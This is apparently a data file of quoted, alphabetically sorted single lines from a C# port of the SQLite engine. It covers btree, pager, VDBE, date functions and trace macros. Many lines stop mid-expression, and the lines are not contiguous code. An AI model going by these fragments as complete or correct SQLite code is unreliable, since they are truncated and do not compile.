"      1,                   /"
"      100-nanosecond intervals since January 1, 1601 (= JD 2305813.5)."
"      2, SQLITE_UTF8, 0 )"
"      3,                /"
"      3,"
"      5,"
"      Array.Clear( pDest, 0, N )"
"      Array.Clear( pV, 0, (int)( sz "
"      Array.Clear( zBuf, 0, n )"
"      Array.Clear( zHeader, aJournalMagic.Length "
"      Array.Clear(data, addr, cbrk - addr)"
"      Array.Clear(data, hdr "
"      Array.Copy( db.aDbStatic, db.aDb, db.aDbStatic.Length )"
"      Array.Copy(pRoot.aOvfl, pChild.aOvfl, pRoot.nOverflow)"
"      Array.Resize( ref pPrior, nByte )"
"      Astronomical Algorithms, 2nd Edition, 1998"
"      Bitmask maskSrc = getMask( pWC.pMaskSet, iCur )"
"      Buffer.BlockCopy( aHardLimit, 0, db.aLimit, 0, aHardLimit.Length "
"      Buffer.BlockCopy( pKey1, offset, aKey1, 0, aKey1.Length )"
"      Buffer.BlockCopy(Encoding.UTF8.GetBytes(zMagicHeader), 0, data, 0, 16)"
"      Buffer.BlockCopy(data, cbrk, temp, cbrk, usableSize - cbrk)"
"      Buffer.BlockCopy(data, ptr "
"      Buffer.BlockCopy(pCell, offset, pTemp, 0, pCell.Length - offset)"
"      CREATE INDEX idx ON t(a,b,c)"
"      CREATE TRIGGER trig BEFORE UPDATE ON t(a,b,c) ..."
"      CSSQLite.sqlite3_prepare_v2( db.Connection(), query, query.Length, ref vm, 0 )"
"      DbClearProperty( db, iDb, DB_Empty )"
"      DbClearProperty( db, idx, DB_UnresetViews )"
"      Debug.Assert( !ExprHasAnyProperty( pA, EP_TokenOnly "
"      Debug.Assert( !ExprHasAnyProperty( pB, EP_TokenOnly "
"      Debug.Assert( !ExprHasAnyProperty( pExpr, EP_IntValue "
"      Debug.Assert( !ExprHasAnyProperty( pExpr, EP_TokenOnly "
"      Debug.Assert( !ExprHasProperty( pExpr, EP_IntValue ) )"
"      Debug.Assert( !ExprHasProperty( pExpr, EP_xIsSelect ) )"
"      Debug.Assert( !ExprHasProperty( pNew, EP_xIsSelect ) )"
"      Debug.Assert( db.aDb[db.nDb - 1].zName == ""vacuum_db"" )"
"      Debug.Assert( p.zSql == """" )"
"      Debug.Assert( sqlite3ExprIsInteger( pE, ref i ) == 0 )"
"      Debug.Assert(!hasReadConflicts(p, pCur.pgnoRoot))"
"      Debug.Assert(SQLITE_OK == querySharedCacheTableLock(p, MASTER_ROOT, READ_LOCK))"
"      Debug.Assert(false == PTRMAP_ISPAGE(pBt, PENDING_BYTE_PAGE(pBt)))"
"      Debug.Assert(get2byte(data, hdr "
"      Debug.Assert(hasSharedCacheTableLock(p, (u32)iTable, pKeyInfo != null "
"      Debug.Assert(hasSharedCacheTableLock(p, pCur.pgnoRoot, pCur.pKeyInfo != null "
"      Debug.Assert(nCell == get2byte(data, hdr "
"      Debug.Assert(sz == cellSize(pPage, idx))"
"      Debug.Assert(sz == cellSizePtr(pPage, pCell))"
"      Debug.Assert(szNew == cellSizePtr(pPage, newCell))"
"      Expr p = sqlite3ExprAlloc( pParse.db, op, pToken, 1 )"
"      Expr pE1a, pE1b, pE1c"
"      Expr pE2a, pE2b, pE2c"
"      Expr pRight, pLeft"
"      ExprSetProperty( pExpr, EP_Resolved )"
"      INSERT INTO t(a,b,c) VALUES ..."
"      IOTRACE( ""CLOSE %p"
"      IOTRACE( ""IOERR"
"      IOTRACE( ""MOVE %p %d %d"
"      IOTRACE( ""OPEN %p %s"
"      IOTRACE( ""PGIN %p %d"
"      If NULL, then tracing is turned off."
"      Index pSrcIdx, pDestIdx"
"      It is sometimes called the ""minor"" token."
"      ManagementObjectSearcher mosLogicalDisks = new ManagementObjectSearcher( ""select "
"      Mem pMem = sqlite3_aggregate_context( context, -1 )"
"      Mem pMem = sqlite3_aggregate_context( context, 0 )"
"      Mem pOut = columnMem( pStmt, i )"
"      MemSetTypeFlag( pMem, MEM_Int )"
"      MemSetTypeFlag( pMem, MEM_Null )"
"      MemSetTypeFlag( pMem, MEM_Real )"
"      OSTRACE2( ""DELETE "
"      OSTRACE2( ""TEMP FILENAME: %s"
"      OSTRACE3( ""CLOSE %d (%s)"
"      OSTRACE3( ""READ %d lock=%d"
"      OSTRACE3( ""SYNC %d lock=%d"
"      OSTRACE3( ""TRUNCATE %d %lld"
"      OSTRACE3( ""WRITE %d lock=%d"
"      OSTRACE5( ""LOCK %d %d was %d(%d)"
"      OSTRACE5( ""UNLOCK %d to %d was %d(%d)"
"      PAGERID( pPager ), pPg.pgno, ( pPg.flags "
"      PAGERID( pPager ), pgno, pager_datahash( pPager.pageSize, aData ),"
"      PAGERID( pPager ), pgno, pager_pagehash( pPg ) )"
"      PAGERTRACE( ""CLOSE %d"
"      PAGERTRACE( ""COMMIT %d"
"      PAGERTRACE( ""DATABASE SYNC: File=%s zMaster=%s nSize=%d"
"      PAGERTRACE( ""FETCH %d page %d hash(%08x)"
"      PAGERTRACE( ""MOVE %d page %d (needSync=%d) moves to %d"
"      PAGERTRACE( ""OPEN %d %s"
"      PAGERTRACE( ""PLAYBACK %d page %d hash(%08x) %s"
"      PAGERTRACE( ""ROLLBACK %d"
"      PAGERTRACE( ""TRANSACTION %d"
"      PgHdr1 pPage = PAGE_TO_PGHDR1( pCache, pPg )"
"      PgHdr1 pp, pPrev"
"      Pgno iPtrMap, ret"
"      Richmond, Virginia (USA)"
"      RowSet p = new RowSet( db, (int)N )"
"      RowSetChunk pChunk, pNextChunk"
"      SQLITE_OK != ( rc = resolveAttachExpr( sName, pDbname ) ) "
"      SQLITE_OK != ( rc = resolveAttachExpr( sName, pFilename ) ) "
"      SQLITE_OK != ( rc = resolveAttachExpr( sName, pKey ) )"
"      SQLITE_UTF8,         /"
"      SQLITE_UTF8,      /"
"      SQLITE_UTF8, SQLITE_STATIC )"
"      SWAP( ref pExpr.pRight, ref pExpr.pLeft )"
"      SWAP( ref pExpr.pRight.pColl, ref pExpr.pLeft.pColl )"
"      System.DateTime RefTime = new System.DateTime( 1970, 1, 1, 0, 0, 0, 0 )"
"      System.DateTime unixStartTime = new System.DateTime( 1970, 1, 1, 0, 0, 0, 0 )"
"      TRACE(""AUTOVACUUM: Moving %d to free page %d (ptr page %d type %d)"
"      TRACE(""BALANCE: copy root %d into %d"
"      TRACE(""BALANCE: finished: old=%d new=%d cells=%d"
"      TRACE(""BALANCE: old: %d %d %d  "","
"      TRACE(""FREE-PAGE: %d new trunk page replacing %d"
"      TRACE(""INSERT: table=%d nkey=%lld ndata=%d page=%d %s"
"      TRACE(""new: %d(%d) %d(%d) %d(%d) %d(%d) %d(%d)"
"      Trigger pList = sqlite3TriggerList( pParse, pTab )"
"      UNUSED_PARAMETER2( NotUsed, NotUsed2 )"
"      UNUSED_PARAMETER2( NotUsed, argc )"
"      UPDATE ON (a,b,c)"
"      VdbeComment( v, ""%s"", pTab.zName )"
"      VdbeComment( v, ""begin trigger %s"", pStepList.pTrig.name )"
"      VdbeComment( v, ""end trigger %s"", pStepList.pTrig.name )"
"      VdbeNoopComment( v, ""A-gt-B subroutine"" )"
"      VdbeNoopComment( v, ""A-lt-B subroutine"" )"
"      VdbeNoopComment( v, ""Begin coroutine for left SELECT"" )"
"      VdbeNoopComment( v, ""Begin coroutine for right SELECT"" )"
"      VdbeNoopComment( v, ""End coroutine for left SELECT"" )"
"      VdbeNoopComment( v, ""End coroutine for right SELECT"" )"
"      VdbeNoopComment( v, ""Output routine for A"" )"
"      VdbeNoopComment( v, ""eof-A subroutine"" )"
"      WHERETRACE( """
"      WHERETRACE( ""best index is %s, nrow=%.9g, cost=%.9g, wsFlags=%x, nEq=%d"
"      WHERETRACE( ""bestIndex: tbl=%s notReady=%llx"
"      Willmann-Bell, Inc"
"      X:   The name of a database.  Ex:  ""main"" or ""temp"" or"
"      [DllImport( ""kernel32.dll"" )]"
"      a database page may be written atomically, and"
"      a free-list leaf page, the page is not written to the database"
"      addr = sqlite3VdbeAddOp3( v, OP_NotExists, iCur, 0, iRowid )"
"      addr = sqlite3VdbeAddOp4( pParse.pVdbe, opcode, in2, dest, in1,"
"      addr1 = sqlite3VdbeAddOp2( v, OP_Rewind, iTab, 0 )"
"      addrAltB = sqlite3VdbeAddOp2( v, OP_Gosub, regOutA, addrOutA )"
"      addrOutA = generateOutputSubroutine( pParse,"
"      aff = (u8)( (u8)sqlite3CompareAffinity( pExpr1, (char)aff ) "
"      analyzeOneTable( pParse, pTab, iStatCur, pParse.nMem "
"      and if either of the following are true, return NULL:"
"      apNew[0].pgno, szNew[0],"
"      apOld[0].pgno,"
"      applyAffinity( (Mem)pVal, affinity, enc )"
"      as purgeable, and if one of the following is true:"
"      attachFunc,       /"
"      azArg[1] = ""1"""
"      azArg[3] = """""
"      be, if it is not at all meaningful"
"      bestOrClauseIndex( pParse, pWC, pSrc, notReady, pOrderBy, pCost )"
"      blocks of size page-size, and"
"      bool isMemdb = zFilename == "":memory:"""
"      btreeParseCell(pCur.apPage[iPage], pCur.aiIdx[iPage], ref info)"
"      btreeParseCellPtr( ( pPage ), findCell( ( pPage ), ( iCell ) ), ref ( pInfo ) )"
"      btreeParseCellPtr( pPage, pCell, ref info )"
"      btreeParseCellPtr( pPage, pTemp, ref info )"
"      btreeParseCellPtr(pPage, pCell, ref debuginfo)"
"      buffer, or"
"      byte _base,"
"      byte charset,"
"      byte flags,"
"      byte type,"
"      byte[] aEnc = { SQLITE_UTF16BE, SQLITE_UTF16LE, SQLITE_UTF8 }"
"      byte[] p = sqlite3DbMallocRaw( db, n )"
"      cbrk = get2byte(data, hdr "
"      checkList(sCheck, 1, (int)sqlite3Get4byte(pBt.pPage1.aData, 32),"
"      codeAttach( pParse, SQLITE_ATTACH, attach_func, p, p, pDbname, pKey )"
"      codeAttach( pParse, SQLITE_DETACH, detach_func, pDbname, null, null, pDbname )"
"      codeOffset( v, p, addrContinue )"
"      codeOffset( v, p, iContinue )"
"      compare2pow63(""9223372036854775800"")"
"      computeLimitRegisters( pParse, p, iEnd )"
"      computeLimitRegisters( pParse, p, labelEnd )"
"      const string zChars = ""abcdefghijklmnopqrstuvwxyz0123456789"""
"      copy of the requested page. If one is found, it is returned."
"      createCollation( db, ""BINARY"", SQLITE_UTF16BE, 0, (dxCompare)binCollFunc, null )"
"      createCollation( db, ""BINARY"", SQLITE_UTF16LE, 0, (dxCompare)binCollFunc, null )"
"      createCollation( db, ""BINARY"", SQLITE_UTF8, 0, (dxCompare)binCollFunc, null )"
"      createCollation( db, ""NOCASE"", SQLITE_UTF8, 0, nocaseCollatingFunc, null )"
"      createCollation( db, ""RTRIM"", SQLITE_UTF8, 1, (dxCompare)binCollFunc, null )"
"      current database image, in pages, OR"
"      dateFunc( context, 0, null )"
"      datetimeFunc( context, 0, null )"
"      db,"
"      db->aDb[iDb].zName, SCHEMA_TABLE(iDb),"
"      db.aDb[0].pSchema = sqlite3SchemaGet( db, db.aDb[0].pBt )"
"      db.aDb[0].zName = ""main"""
"      db.aDb[1].pSchema = sqlite3SchemaGet( db, null )"
"      db.aDb[1].zName = ""temp"""
"      db.pDfltColl = sqlite3FindCollSeq( db, SQLITE_UTF8, ""BINARY"", 0 )"
"      decodeFlags(pPage, flags)"
"      detachFunc,          /"
"      disableTerm( pLevel, pTerm )"
"      double r1, r2"
"      double val = sqlite3_value_double( columnMem( pStmt, i ) )"
"      dropCell(pPage, iCellIdx, cellSizePtr(pPage, pCell), ref rc)"
"      dxAccess xAccess,"
"      dxCheckReservedLock xCheckReservedLock,"
"      dxClose xClose,"
"      dxCurrentTime xCurrentTime,"
"      dxDelete xDelete,"
"      dxDlClose xDlClose,"
"      dxDlError xDlError,"
"      dxDlOpen xDlOpen,"
"      dxDlSym xDlSym,"
"      dxFileControl xFileControl,"
"      dxFileSize xFileSize,"
"      dxFree xFree,"
"      dxFullPathname xFullPathname,"
"      dxLock xLock,"
"      dxMalloc xMalloc,"
"      dxMemInit xInit,"
"      dxMemShutdown xShutdown,"
"      dxMutexAlloc xMutexAlloc,"
"      dxMutexEnd xMutexEnd,"
"      dxMutexEnter xMutexEnter,"
"      dxMutexFree xMutexFree,"
"      dxMutexHeld xMutexHeld,"
"      dxMutexInit xMutexInit,"
"      dxMutexLeave xMutexLeave,"
"      dxMutexTry xMutexTry,"
"      dxOpen xOpen,"
"      dxRandomness xRandomness,"
"      dxRead xRead,"
"      dxRealloc xRealloc,"
"      dxRoundup xRoundup,"
"      dxSectorSize xSectorSize,"
"      dxSize xSize,"
"      dxSleep xSleep,"
"      dxSync xSync,"
"      dxTruncate xTruncate,"
"      dxUnlock xUnlock,"
"      dxWrite xWrite,"
"      either min(x) or max(x), where x is a column reference."
"      elem = findElementGivenHash( pH, pKey, nKey, h )"
"      else if ( ExprHasProperty( pExpr, EP_xIsSelect ) )"
"      else if ( ExprHasProperty( pOrig, EP_IntValue ) "
"      else if ( SQLITE_OK == ( rc = sqlite3VdbeMemGrow( pMem, amt "
"      else if ( String.Compare( pExpr.u.zToken, ""max"", true ) == 0 )//sqlite3StrICmp(pExpr->u.zToken,""max"")==0 )"
"      else if ( parseHhMmSs( zDate, p ) == 0 )"
"      else if ( pzErrMsg != """" )"
"      else if ( sqlite3IsNumber( zDate, ref isRealNum, SQLITE_UTF8 ) != 0 )"
"      else if ( sqlite3StrICmp( z, ""file"" ) == 0 )"
"      else if ( sqlite3StrICmp( z, ""memory"" ) == 0 )"
"      else if ( sqlite3StrICmp( zDate, ""now"" ) == 0 )"
"      else if (yyTracePrompt == """") yyTraceFILE = null"
"      else { pIndex.zName = zName.Substring( 0, nName )"
"      emptySrcTest = sqlite3VdbeAddOp2( v, OP_Rewind, iSrc, 0 )"
"      exprAnalyzeAll( pSrc, pOrWc )"
"      exprAnalyzeAll( pTabList, pWC )"
"      findTerm( pWC, iCur, -1, 0, WO_EQ "
"      for ( elem = pH.first, pH.first = null "
"      for ( i = 0, j = n - 1 "
"      for ( i = 0, pIdx = pTab.pIndex "
"      for ( i = 1, pIdx = pTab.pIndex "
"      for ( iCur = 0, pIdx = pTab.pIndex "
"      for ( j = 0, pIdx = pTab.pIndex "
"      for ( nIdx = 0, pIdx = pTab.pIndex "
"      for ( pTrig = sqlite3TriggerList( pParse, pTab ) "
"      fprintf( _out, """
"      fprintf( _out, ""reg[%d] = "", iReg )"
"      freeP4( db, pOp.p4type, pOp.p4.p )"
"      generateColumnTypes( pParse, pTabList, pEList )"
"      getVarint32( m.zBLOB, 0, ref szHdr )"
"      getVarint32( m.zBLOB, szHdr - 1, ref typeRowid )"
"      globInfo, (dxFunc)likeFunc, null, null )"
"      handle = sqlite3OsDlOpen( pVfs, zFile )"
"      has been provided, or"
"      heightOfExpr( p.pLeft, ref nHeight )"
"      heightOfExpr( p.pRight, ref nHeight )"
"      heightOfSelect( p, ref nHeight )"
"      i = sqlite3FindDbName( db, zName )"
"      iDb = sqlite3SchemaToIndex( db, p.pSchema )"
"      iDb = sqlite3SchemaToIndex( db, pIndex.pSchema )"
"      iDb = sqlite3SchemaToIndex( db, pNew.pSchema )"
"      iDb = sqlite3SchemaToIndex( db, pTab.pSchema )"
"      iDb = sqlite3SchemaToIndex( pParse.db, pTab.pSchema )"
"      iDb = sqlite3SchemaToIndex( pParse.db, pTrig.pSchema )"
"      iDb = sqlite3SchemaToIndex( pParse.db, pTrigger.pSchema )"
"      iDb = sqlite3TwoPartName( pParse, pId1, pId2, ref pId )"
"      iDb = sqlite3TwoPartName( pParse, pName1, pName2, ref pName )"
"      iDb = sqlite3TwoPartName( pParse, pName1, pName2, ref pObjName )"
"      iDbPage, iFreePage, iPtrPage, eType)"
"      iDbSrc = sqlite3SchemaToIndex( pParse.db, pSrc.pSchema )"
"      iPtrmap = (int)PTRMAP_PAGENO(pBt, key)"
"      iPtrmap = PTRMAP_PAGENO(pBt, key)"
"      iTabDb = sqlite3SchemaToIndex( db, pTab.pSchema )"
"      id.fs.Seek( offset, SeekOrigin.Begin )"
"      identPut( zStmt, ref k, p.zName )"
"      idx = (u32)getVarint32( aKey, 0, ref szHdr )"
"      if ( !DbHasProperty( db, idx, DB_UnresetViews ) ) return"
"      if ( !ExprHasAnyProperty( p, EP_TokenOnly ) )"
"      if ( !ExprHasAnyProperty( pExpr, EP_VarSelect ) "
"      if ( !ExprHasProperty( p, EP_IntValue ) "
"      if ( !ExprHasProperty( p, EP_Static ) )"
"      if ( !sqlite3ExprCompare( pA.pLeft, pB.pLeft ) ) return false"
"      if ( !sqlite3ExprCompare( pA.pRight, pB.pRight ) ) return false"
"      if ( !sqlite3IsLikeFunction( db, pExpr, ref pnoCase, wc ) )"
"      if ( ( 0 != ( rc = write32bits( pPager.jfd, iHdrOff, (u32)PAGER_MJ_PGNO( pPager ) ) ) )"
"      if ( ( LastResult = CSSQLite.sqlite3_bind_int64( vm, index, bLong ) ) == CSSQLite.SQLITE_OK )"
"      if ( ( LastResult = CSSQLite.sqlite3_bind_text( vm, index, bText ,-1,null) ) == CSSQLite.SQLITE_OK )"
"      if ( ( pStat = sqlite3FindTable( db, ""sqlite_stat1"", pDb.zName ) ) == null )"
"      if ( ( zWhere = whereTempTriggers( pParse, pTab ) ) != """" )"
"      if ( (LastResult = CSSQLite.sqlite3_bind_int( vm, index, bInteger ))== CSSQLite.SQLITE_OK )"
"      if ( 0 == sqlite3StrICmp( z, ""full"" ) ) return BTREE_AUTOVACUUM_FULL"
"      if ( 0 == sqlite3StrICmp( z, ""incremental"" ) ) return BTREE_AUTOVACUUM_INCR"
"      if ( 0 == sqlite3StrICmp( z, ""none"" ) ) return BTREE_AUTOVACUUM_NONE"
"      if ( ExprHasAnyProperty( pExpr, EP_Resolved ) ) return WRC_Prune"
"      if ( ExprHasProperty( p, EP_Reduced ) ) return EXPR_REDUCEDSIZE"
"      if ( ExprHasProperty( p, EP_TokenOnly ) ) return EXPR_TOKENONLYSIZE"
"      if ( ExprHasProperty( p, EP_xIsSelect ) )"
"      if ( ExprHasProperty( pA, EP_IntValue ) )"
"      if ( ExprHasProperty( pA, EP_xIsSelect ) "
"      if ( ExprHasProperty( pExpr, EP_FromJoin ) )"
"      if ( NEVER( ExprHasProperty( pExpr, EP_xIsSelect ) ) ) return 0"
"      if ( SQLITE_NOMEM == sqlite3ApiExit( p.db, p.rc ) )"
"      if ( SQLITE_OK != ( rc = read32bits( pPager.jfd, iHdrOff "
"      if ( SQLITE_OK != ( rc = sqlite3OsFileSize( pJrnl, ref szJ ) )"
"      if ( SQLITE_OK != sqlite3CheckObjectName( pParse, zName ) )"
"      if ( SQLITE_OK != sqlite3_prepare( db, zSql, -1, ref pStmt, ref Dummy ) )"
"      if ( SQLITE_OK == ( rc = sqlite3OsFileSize( pPager.jfd, ref jrnlSize ) )"
"      if ( SQLITE_OK == sqlite3VdbeMemGrow( pMem, nByte, 0 ) )"
"      if ( String.Compare( pExpr.u.zToken, ""min"", true ) == 0 )//sqlite3StrICmp(pExpr->u.zToken,""min"")==0 )"
"      if ( checkForMultiColumnSelectError( pParse, pDest, pEList.nExpr ) )"
"      if ( db.aDb.Length <= db.nDb ) Array.Resize( ref db.aDb, db.nDb "
"      if ( fileExists( db, ""vdbe_trace"" ) != 0 )"
"      if ( getDigits( zDate, 2, 0, 24, ':', ref  h, 2, 0, 59, '"
"      if ( getDigits( zDate.Substring( 1 ), 2, 0, 14, ':', ref nHr, 2, 0, 59, '"
"      if ( getDigits( zDate.Substring( zIndex ), 4, 0, 9999, '-', ref Y, 2, 1, 12, '-', ref M, 2, 1, 31, '"
"      if ( isDate( context, argc, argv, ref x ) == 0 )"
"      if ( isLikeOrGlob( pParse, pExpr, ref nPattern, ref isComplete, ref noCase ) != 0"
"      if ( isLookaside( db, p ) )"
"      if ( p.trace != null ) registerTrace( p.trace, R, M )"
"      if ( parseYyyyMmDd( zDate, p ) == 0 )"
"      if ( rc != 0 ) sqlite3_result_error_code( context, rc )"
"      if ( sqlite3AuthCheck( pParse, SQLITE_TRANSACTION, ""BEGIN"", null, null ) != 0 )"
"      if ( sqlite3AuthCheck( pParse, SQLITE_TRANSACTION, ""COMMIT"", null, null ) != 0 )"
"      if ( sqlite3AuthCheck( pParse, SQLITE_TRANSACTION, ""ROLLBACK"", null, null ) != 0 )"
"      if ( sqlite3BtreeSetPageSize( pTemp, sqlite3BtreeGetPageSize( pMain ), nRes, 0 ) != 0"
"      if ( sqlite3CheckCollSeq( pParse, pColl ) != 0 )"
"      if ( sqlite3FindFunction( db, zName, nName, nArg, SQLITE_UTF8, 0 ) == null )"
"      if ( sqlite3FindTable( db, ""sqlite_sequence"", zDb ) != null )"
"      if ( sqlite3FindTable( db, ""sqlite_stat1"", sInfo.zDatabase ) == null )"
"      if ( sqlite3FindTable( db, zName, zDb ) != null "
"      if ( sqlite3FixInit( sFix, pParse, iDb, ""trigger"", nameToken ) != 0"
"      if ( sqlite3FixInit( sFix, pParse, iDb, ""trigger"", pName ) != 0 "
"      if ( sqlite3FixInit( sFix, pParse, iDb, ""view"", pName ) != 0"
"      if ( sqlite3HashFind( ( db.aDb[iDb].pSchema.trigHash ),"
"      if ( sqlite3IndexedByLookup( pParse, pItem ) != 0 )"
"      if ( sqlite3IsReadOnly( pParse, pTab, ( pTrigger != null "
"      if ( sqlite3IsReadOnly( pParse, pTab, tmask ) )"
"      if ( sqlite3LocateCollSeq( pParse, zColl ) != null )"
"      if ( sqlite3MemCompare( argv[0], argv[1], pColl ) != 0 )"
"      if ( sqlite3ResolveExprNames( nc, ref pE ) != 0 )"
"      if ( sqlite3ResolveExprNames( sNC, ref pWhere ) != 0 )"
"      if ( sqlite3StrICmp( z, ""OID"" ) == 0 ) return true"
"      if ( sqlite3StrICmp( z, ""ROWID"" ) == 0 ) return true"
"      if ( sqlite3StrICmp( z, ""_ROWID_"" ) == 0 ) return true"
"      if ( sqlite3StrICmp( zLeft, ""default_cache_size"" ) == 0 )"
"      if ( sqlite3StrNICmp( pTab.zName, ""sqlite_"", 7 ) == 0 )"
"      if ( sqlite3StrNICmp( pTab.zName, ""sqlite_"", 7 ) == 0"
"      if ( sqlite3TriggerList( pParse, pDest ) != null )"
"      if ( sqlite3VdbeAddopTrace ) sqlite3VdbePrintOp( null, i, p.aOp[i] )"
"      if ( sqlite3VdbeMemGrow( pMem, nByte, 0 ) != 0 )"
"      if ( sqlite3VdbeMemSetStr( pCtx.s, z, n, enc, xDel ) == SQLITE_TOOBIG )"
"      if ( sqlite3ViewGetColumnNames( pParse, pTab ) != -0 )"
"      if ( sqlite3ViewGetColumnNames( pParse, pTab ) != 0 )"
"      if ( sqlite3WalkExpr( pWalker, ref p.pHaving ) != 0 ) return WRC_Abort"
"      if ( sqlite3WalkExpr( pWalker, ref p.pLimit ) != 0 ) return WRC_Abort"
"      if ( sqlite3WalkExpr( pWalker, ref p.pOffset ) != 0 ) return WRC_Abort"
"      if ( sqlite3WalkExpr( pWalker, ref p.pWhere ) != 0 ) return WRC_Abort"
"      if ( sqlite3WalkExprList( pWalker, p.pEList ) != 0 ) return WRC_Abort"
"      if ( sqlite3WalkExprList( pWalker, p.pGroupBy ) != 0 ) return WRC_Abort"
"      if ( sqlite3WalkExprList( pWalker, p.pOrderBy ) != 0 ) return WRC_Abort"
"      if ( sqlite3_initialize() != 0 ) return """""
"      if ( v != null ) sqlite3VdbeMemSetStr( v, z, n, enc, xDel )"
"      if ( zDate.Length == 6 ) zDate = """""
"      if ( zErrDyn != """" )"
"      if ( zErrMsg != """" )"
"      if ( zIn.Contains( ""blob"" ) ) return SQLITE_AFF_NONE"
"      if ( zIn.Contains( ""char"" ) "
"      if ( zIn.Contains( ""doub"" ) "
"      if ( zIn.Contains( ""int"" ) ) return SQLITE_AFF_INTEGER"
"      if ( zLeft == """" ) return"
"      if ( zName == null ) zName = """""
"      if ( zPattern == """" )"
"      if ( zSql != """" )"
"      if ( zSql == null ) zSql = """""
"      if (!PTRMAP_ISPAGE(pBt, iLastPg) "
"      if ((rc = btreeGetPage(pBt, (Pgno)iPage, ref pPage, 0)) != 0)"
"      if (checkRef(pCheck, (u32)iPage, zParentContext) != 0) return 0"
"      if (pc < get2byte(data, hdr "
"      if (yyTraceFILE == null) yyTracePrompt = """""
"      inReg = sqlite3ExprCode( pParse, pExpr, target )"
"      inReg = sqlite3ExprCodeTarget( pParse, pExpr, target )"
"      insertCell(pPage, idx, newCell, szNew, null, 0, ref rc)"
"      int Y, M, D, A, B, X1, X2"
"      int Z, A, B, C, D, E, X1"
"      int a = 0, b = 0"
"      int addr = sqlite3VdbeAddOp3( p, op, p1, p2, p3 )"
"      int addr, pbegin, hdr"
"      int addr1, addr2"
"      int c, c2"
"      int delay, prior"
"      int end, addr = 0"
"      int exp, e2"
"      int f1, f2"
"      int h, i"
"      int hdr, cellStart"
"      int i = sqlite3FindDbName( pDb, zDb )"
"      int i, c"
"      int i, j"
"      int i, j, k"
"      int i, j, n"
"      int i, k, n"
"      int i, n"
"      int i, nx, pc, op"
"      int i, rc"
"      int i, rc, depth, d2, pgno, cnt"
"      int iCol = -1, i"
"      int iDb = sqlite3SchemaToIndex( db, pIndex.pSchema )"
"      int iSrc, iDest"
"      int iType = sqlite3_value_type( columnMem( pStmt, i ) )"
"      int j, k"
"      int j2 = 0, j3"
"      int mnReq, int mxReq"
"      int mxPathname,"
"      int n = 0, mx = 0"
"      int nByte = dupedExprStructSize( p, flags ) "
"      int nCopy = MIN( nSrcPgsz, nDestPgsz )"
"      int nOld, nNew"
"      int nSrc, n, rc"
"      int nVal, nSep"
"      int p1, p2"
"      int r = sqlite3StrNICmp( pKey1, pKey2, ( nKey1 < nKey2 ) "
"      int r1 = 0, r2 = 0"
"      int r1 = 0, r2 = 0, r3 = 0, r4 = 0"
"      int r2 = sqlite3ExprCodeTarget( pParse, pExpr, r1 )"
"      int rc = read32bits( fd, (int)offset, ref pRes )"
"      int rc = read32bits( fd, offset, ref u32_pRes )"
"      int rc = sqlite3OsFileSize( pFile, ref iCurrent )"
"      int rc = sqlite3OsRead( fd, ac, ac.Length, offset )"
"      int rc, n"
"      int regBase = sqlite3GetTempRange( pParse, nExpr "
"      int regData, regRowid"
"      int result = sqlite3GetVarint( p, 0, ref u64_v )"
"      int result = sqlite3GetVarint( p, offset, ref u64_v )"
"      int result = sqlite3GetVarint( p, offset, ref v )"
"      int result = sqlite3GetVarint32( p, 0, ref u32_v )"
"      int result = sqlite3GetVarint32( p, offset, ref u32_v )"
"      int szOsFile,"
"      int val = sqlite3_value_bytes( columnMem( pStmt, i ) )"
"      int val = sqlite3_value_bytes16( columnMem( pStmt, i ) )"
"      int val = sqlite3_value_int( columnMem( pStmt, i ) )"
"      int[] iLength = new int[] { 2, 2, 3, 5, 3, 4, 4 }"
"      int[] iOffset = new int[] { 0, 1, 2, 4, 9, 12, 16 }"
"      invalidateIncrblobCursors(p, 0, 1)"
"      involving NaN. For example, x != x evaluates to true if x is NaN"
"      j1 = sqlite3VdbeAddOp0( v, OP_Goto )"
"      line of trace output.  If NULL, then tracing is"
"      loadAnalysis( pParse, iDb )"
"      mask = exprTableUsage( pMaskSet, p.pRight )"
"      memTracePrint( _out, p )"
"      memjrnlTruncate( pJfd, 0 )"
"      n = (int)sqlite3PagerMaxPageCount(p.pBt.pPager, mxPage)"
"      n = sqlite3Get4byte(pPage1.aData, 36)"
"      nFree = (int)sqlite3Get4byte(pPage1.aData, 36)"
"      nOld, nNew, nCell)"
"      nTabName = sqlite3Utf8CharLen( zTabName, -1 )"
"      no outstanding references to any pages, and is in the error state,"
"      null,                /"
"      null,             /"
"      object pAppData,"
"      offset = (int)PTRMAP_PTROFFSET((u32)iPtrmap, key)"
"      offset = (int)PTRMAP_PTROFFSET(iPtrmap, key)"
"      on the database file), then an attempt is made to obtain a"
"      openStatTable( pParse, iDb, iStatCur, null )"
"      openStatTable( pParse, iDb, iStatCur, pTab.zName )"
"      or, if the virtual table is stored in a non-sharable database, then"
"      ovflPgno = sqlite3Get4byte(pPage.aData, pCell, info.iOverflow)"
"      p = ( ExprHasProperty( pX, EP_xIsSelect ) "
"      p = (Table)sqlite3HashInsert( ref pDb.pSchema.tblHash, zTabName,"
"      p = functionSearch( db.aFunc, h, zName, nName )"
"      p = sqlite3FindFunction( db, zFunctionName, nName, nArg, enc, 0 )"
"      p = sqlite3FindFunction( db, zFunctionName, nName, nArg, enc, 1 )"
"      p = sqlite3FindTable( pParse.db, zName, zDbase )"
"      p = sqlite3PExpr( pParse, TK_REGISTER, null, null, pToken )"
"      p = sqlite3SrcListAppend( db, p, pTable, pDatabase )"
"      p, destA, pDest, regOutA,"
"      p.Context = sqlite3_aggregate_context( context, -1 )"
"      p.Context = sqlite3_aggregate_context( context, 0 )"
"      p.pHaving = substExpr( db, p.pHaving, iTable, pEList )"
"      p.pRight = rowSetNDeepTree( ref ppList, iDepth - 1 )"
"      p.pSelect = sqlite3SelectDup( db, pSelect, EXPRDUP_REDUCE )"
"      p.pWhere = substExpr( db, p.pWhere, iTable, pEList )"
"      p.zSql = z.Substring( 0, n )"
"      p.zText.Append( z.Substring( 0, N <= z.Length "
"      p4 = sqlite3BinaryCompareCollSeq( pParse, pLeft, pRight )"
"      p4, P4_COLLSEQ )"
"      p5 = binaryCompareP5( pLeft, pRight, jumpIfNull )"
"      pAccum.zText.AppendFormat( ""{0,"" "
"      pBest = (Mem)sqlite3_aggregate_context( context, -1 )"
"      pCell = findCell(pPage, iCellIdx)"
"      pCol.zType = sqlite3NameFromToken( pParse.db, pType )"
"      pColl = (CollSeq[])sqlite3HashFind( db.aCollSeq, zName, nName )"
"      pColl = sqlite3ExprCollSeq( pParse, pLeft )"
"      pColl = sqlite3FindCollSeq( db, (u8)enc2, zName, 0 )"
